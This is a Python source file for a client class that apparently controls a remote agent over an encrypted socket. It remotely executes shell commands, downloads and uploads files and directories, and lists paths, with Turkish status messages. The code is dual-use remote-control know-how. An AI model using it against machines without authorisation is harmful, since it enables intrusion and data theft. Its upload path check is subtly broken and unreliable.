#!/usr/bin/env python3 

# -*- encoding: utf-8 -*-
import os

from core.utils.printing import *

from core.utils.commons.commands import Commands
from core.utils.commons.commands import ErrorMessages
from core.utils.commons.networking import pack_msg
from core.utils.commons.networking import JSONPacker,JSONUnpacker
from core.utils.parser import parse_list
from core.utils.parser import parse_header
from core.utils.commons.io_utils import Modes
from core.utils.commons.io_utils import IOUtils

from core.utils.commons.socket_utils import SockUtils

class Client:

    def __init__(self,client_sock = None,client_aes_key = None,client_aes_iv = None,auto_exit_on_session = False,max_client_sock_timeout = 15) -> None:
        self.__sock = SockUtils(socket_descriptor = client_sock,aes_key = client_aes_key,aes_iv = client_aes_iv,max_timeout = max_client_sock_timeout)
        self.auto_exit_on_session = auto_exit_on_session
    def create_package_request(self,header: str,**commands):
        self.__sock.send(header,commands=commands)
    def download(self,path: str):
        total_file = 1
        total_dir = 1
        self.create_package_request(Commands.COMMAND_DO_DOWNLOAD,path=path)
        while True:
            raw_data = self.__sock.recv()
            header = parse_header(dictionary=raw_data,index=0)
            data = raw_data[header]
            if data:
                filepath = data["file_path"]
                filedata = data["file_data"]
                if filepath == path:
                    print_status(f"İndiriliyor: {filepath}")
                    with IOUtils(file_name=os.path.basename(filepath),mode=Modes.MODE_WRITE_AS_BINARY) as io_handler:
                        io_handler.write(filedata)
                    print_succes(f"İndirildi: {filepath}")
                    total_file = total_file + 1
                    break
                elif filepath == "invalid_path":
                    print_failure(f"Geçersiz patika: {path}")
                    break
                elif filepath == "EOP":
                    break
                elif filepath == "invalid_file_type":
                    print_failure(f"Bilinmeyen dosya biçimi: {path}")
                    break
                elif filepath == ErrorMessages.ERR_MSG_I_CANT_DO_DOWNLOAD:
                    print_failure(f"Hata {path} dosyası veya klasörü indirilemedi ")
                    break
                else:
                    basedir_name = os.path.basename(path)
                    if not os.path.exists(basedir_name):
                        os.makedirs(basedir_name)
                    splitted_path = filepath.split(path)[1]
                    mirrored_full_path = os.getcwd() + os.sep + os.path.basename(path) + splitted_path
                    mirrored_full_path_basename = os.path.basename(mirrored_full_path)
                    mirrored_full_path_dirname = os.path.dirname(mirrored_full_path)

                    if not os.path.exists(mirrored_full_path_dirname):
                        print_status(f"Klasör oluşturuluyor: {mirrored_full_path_dirname} ")
                        os.makedirs(mirrored_full_path_dirname)
                        total_dir = total_dir + 1
                    print_status(f"İndiriliyor: {mirrored_full_path_basename}")
                    with IOUtils(file_name=mirrored_full_path,mode=Modes.MODE_WRITE_AS_BINARY) as io_handler:
                        io_handler.write(filedata)
                    print_succes(f"İndirildi: {mirrored_full_path_basename}")
                    total_file = total_file + 1

            else:
                break
    
    def upload(self,path: str):
        if not os.path.exists(path):
            print_failure(f"Hata {path} mevcut değil")
        elif not os.path.isfile(path) or not os.path.isdir(path):
            print_failure(f"Hata {path} dosya veya klasör değil")
        self.create_package_request(Commands.COMMAND_DO_UPLOAD,path)
        for root,_,files in os.walk(path):
            for f in files:
                full_path = os.path.join(
                    root,
                    f
                )
                with IOUtils(file_name = full_path,mode = Modes.MODE_READ_AS_BINARY) as io:
                    data = io.read()
                    res = self.__sock.send_and_recv(
                        "file_credentials",
                        full_path,
                        data
                    )
                    response = res["file_credentials"]
                    response_header = parse_list(response,index = 0)
                    response_exception = parse_list(response,index = 1)
                    if response_header == ErrorMessages.ERR_MSG_I_CANT_DO_UPLOAD:
                        print_failure(f"Hata {full_path} upload yapılırken bir hata oluştu sebebi ise ~ {response_exception}")
                    elif response_header == "EOP":
                        break
                    else:
                        if os.path.isfile(full_path):
                            print_status(f"Yüklendi: {os.path.basename(full_path)}")
                        elif os.path.isdir(full_path):
                            print_status(f"Klasör oluşturuluyor: {os.path.basename(os.path.dirname(full_path))}")
    def shell(self,command: str):
        self.create_package_request(
            Commands.COMMAND_DO_SHELL_EXEC,commands=command
        )
        self.__sock.settimeout(15)
        ret = self.__sock.recv()
        header = parse_header(ret,index=0)
        data = ret[header]
        if header == ErrorMessages.ERR_MSG_I_CANT_DO_SHELL_EXEC:
            exc = data["exception"]
            print_failure("Hata %s komutu çalıştırılırken bir hata oluştu: %s" % (command,exc))
        else:
            command_output = data["command_output"]
            print_status(command_output)
    def ls(self,path: str):
        if path == "" :
            path = "." # current path
        self.create_package_request(Commands.COMMAND_DO_LIST_CURRENT_PATH,
        path=path
        )
        ret = self.__sock.recv()
        if not ret is None:
            pkt_header = parse_header(ret,index=0)
            data = ret[pkt_header]
            if not pkt_header == ErrorMessages.ERR_MSG_I_CANT_DO_LIST_CURRENT_PATH:
                data = data["data"]
                for p in data:
                    print_status(p)
            else:
                data = data["data"]
                if data == "invalid_path":
                    print_failure("%s Klasör mevcut değil !" % (path))
                elif data == "path_is_not_dir":
                    print_failure("%s Klasör değil !" % (path))
    def pwd(self,*args):
        self.create_package_request(Commands.COMMAND_DO_GET_PWD)
        ret = self.__sock.recv()
        if ret:
            pwd = ret[Commands.COMMAND_DO_GET_PWD]["pwd"]
            print_status("Şuan ki konum: %s" % (pwd))
    def is_online(self) -> bool:
        res = self.__sock.client_is_online()
        return True if res == Commands.COMMAND_CLIENT_ONLINE else False